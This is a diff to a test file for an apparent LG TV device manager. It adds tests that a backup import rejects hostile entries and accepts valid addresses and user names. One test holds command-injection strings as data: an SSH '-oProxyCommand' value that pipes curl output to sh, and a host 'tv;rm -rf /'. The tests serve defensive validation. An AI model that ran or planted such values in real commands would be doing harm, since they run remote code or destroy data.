@@ -1,5 +1,6 @@
 import { beforeEach, describe, expect, it } from 'vitest';
 import {
+  BackupError,
   addDevice,
   clearAllDevices,
   exportDevices,
@@ -54,6 +55,43 @@ describe('browser device store', () => {
 
   it('rejects files that are not a device export', async () => {
     await expect(importDevices({ hello: 'world' })).rejects.toThrow();
+  });
+
+  it('refuses a hostile backup as a whole, with a clear message that does not echo secrets', async () => {
+    await addDevice(tv('Good'));
+    const file = JSON.parse(JSON.stringify(await exportDevices()));
+    await clearAllDevices();
+    const good = file.devices[0];
+    const evilUser = { ...good, id: 'evil-1', name: 'Trap', username: '-oProxyCommand=sh -c "curl x|sh"' };
+    const err = await importDevices({ ...file, devices: [good, evilUser] }).catch((e: unknown) => e);
+    expect(err).toBeInstanceOf(BackupError);
+    expect((err as Error).message).toBe('Nothing was imported: TV “Trap” in this backup has a user name that isn’t allowed. Only import backups you made yourself.');
+    expect((err as Error).message).not.toContain('A1B2C3');
+    expect(await listDevices()).toEqual([]);
+
+    for (const host of ['-oProxyCommand=sh', '192.0.2.10 -p 22', 'tv;rm -rf /', 'http://192.0.2.10', '']) {
+      const e = await importDevices({ ...file, devices: [{ ...good, host }] }).catch((x: unknown) => x);
+      expect(e).toBeInstanceOf(BackupError);
+      expect((e as Error).message).toContain('has an address that isn’t an IP address or host name');
+    }
+    for (const username of ['-l', 'Root', 'root user', '', 'a'.repeat(40)]) {
+      await expect(importDevices({ ...file, devices: [{ ...good, username }] })).rejects.toThrow('has a user name that isn’t allowed');
+    }
+    expect(await listDevices()).toEqual([]);
+  });
+
+  it('accepts the addresses and user names the forms accept (and trims the address)', async () => {
+    await addDevice(tv('Good'));
+    const file = JSON.parse(JSON.stringify(await exportDevices()));
+    await clearAllDevices();
+    const good = file.devices[0];
+    expect(await importDevices({ ...file, devices: [{ ...good, host: ' tv.local ', username: 'root' }] })).toBe(1);
+    expect((await listDevices())[0]).toMatchObject({ host: 'tv.local', username: 'root' });
+    expect(await importDevices({ ...file, devices: [{ ...good, id: 'v6', name: 'V6', host: '[2001:db8::1]', username: 'prisoner' }] })).toBe(1);
+  });
+
+  it('says so when the file is not a backup at all', async () => {
+    await expect(importDevices({ format: 'something-else', devices: [] })).rejects.toThrow('That file is not an LG Dev Manager device backup.');
   });
 
   it('sends only connection fields to the bridge', async () => {
